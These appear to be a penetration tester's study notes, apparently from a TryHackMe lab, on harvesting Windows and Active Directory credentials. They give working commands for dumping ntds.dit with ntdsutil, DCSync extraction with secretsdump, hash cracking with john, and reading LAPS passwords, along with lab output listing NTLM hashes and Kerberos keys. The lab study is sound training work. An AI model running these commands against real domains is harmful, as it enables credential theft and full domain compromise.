
### Requirements
- NT AUTHORITY\ SYSTEM privileges


### Regular password gathering
Includes:
- Logonpasswords
- Passwords to other domain users (if Domain Controller)
[[Mimikatz]]


### Windows credential manager
Includes:
- Web credentials contain authentication details stored in Internet browsers or other applications.
- Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
- Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
- Certificate-based credentials: Athunticated details based on certifications.
Usage: 
```cmd
vaultcmd /list                          // Prints the available vaults
vaultcmd /listcreds:"Web Credentials"   // Prints the saved web-credentials (use Get-WebCredentials.ps1 to view)
```
[[Mimikatz#Windows credential manager]]


### Attacks on the Domain Controller
Main target: NTDS Domain controller.
The NTDS Domain Controller is a database with all the credentials, objects and more of an AD.  It's an encrypted file located in `C:\Windows\NTDS\ntds.dit` .  It's also locked, so you can't just copy the file.
For 
If you want to dump the contents, you need these files:
```
C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```
### Local dumping (no credentials necessary)
One-liner to dump all files into the `C:\temp` directory:
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"      // Make sure to run as admin
```
Download the files to your machine. (example: xfreerdp drive)
Local NTDS hash extraction
```bash
python3 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

### Remote dumping (credentials necessary)
For remote dumping, we will use the DC SYNC attack
DC SYNC attacks require these AD permissions:
- Replicating Directory Changes
- Replicating Directory

```python3
secretsdump.py -just-dc DOMAIN/<AD_Admin_User>@IP_ADDRESS
```
`-just-dc` --> Extracts the NTDS data (prints the hashes)

##### Example output
```
┌─[✗]─[root@edu-virtualbox]─[/home/edu/THM]
└──╼ #secretsdump.py -just-dc THM.red/thm@10.10.95.62
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:bb82c431eb0555c76bf05d78a49ce0f0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:c37ddc1d59ec2c9266638f7e5a5e1e366ffdff8788e29850b762a7aafc49202e
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:409a08704ec6af415eb0f092dcc8f79b
CREDS-HARVESTIN$:des-cbc-md5:9dea76c25d1cb07a
[*] Cleaning up...

```

#### Cracking
Note: Make sure to crack them using the `NT` form
Cracking:
```
john --format=nt -w=/usr/share/wordlists/rockyou.txt OUTPUT_FILE
```


### Local Administrator Password Solution (LAPS)
- Note: AD-Only
LAPS is a way for Domain Controllers/ Domain Admins to set the admin password for all Domain-connected devices.
#### Check if LAPS exists
Laps will have a file named `admpwd.dll` in the system, at the `C:\Program Files\LAPS\CSE` location.
```
dir "C:\Program Files\LAPS\CSE"
```
##### Example output
```
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM              .
06/06/2022  01:01 PM              ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,306,015,232 bytes free
```


##### Checking the rights to read
Then, check the read rights (required:  extended permissions)
```
Find-AdmPwdExtendedRights -Identity *            // List names
Find-AdmPwdExtendedRights -Identity USERNAME     // Read of specific names
```
##### Example output
```
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity *

Name                 DistinguishedName                                                 Status
----                 -----------------                                                 ------
Domain Controllers   OU=Domain Controllers,DC=thm,DC=red                               Delegated
THMorg               OU=THMorg,DC=thm,DC=red                                           Delegated
Find-AdmPwdExtendedRights : More than one object found, search using distinguishedName instead
At line:1 char:1
+ Find-AdmPwdExtendedRights -Identity *
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Find-AdmPwdExtendedRights], AmbiguousResultException
    + FullyQualifiedErrorId : AdmPwd.PSTypes.AmbiguousResultException,AdmPwd.PS.FindExtendedRights

PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}
```

##### Exploitation
If the extended permission is enabled, we can read the LAPS. 
In this example, the name is `LAPsReader`, so we will check the users in the group:
```
net groups "LAPsReader"
// Example output:
Group name     LAPsReader
Comment
Members
-------------------------------------------------------------------------------
bk-admin
The command completed successfully.
```

Then we need to run the `Get-AdmPwdPassword` command as that user:
```
Get-AdmPwdPassword -ComputerName thm.local   // Example computername, if unsure use "Get-adcomputer -filter *"
```
And the password will be printed.

### Kerberoasting
See [[Kerberoasting]]

### AS-REP roasting
See [[AS-REP roasting]]
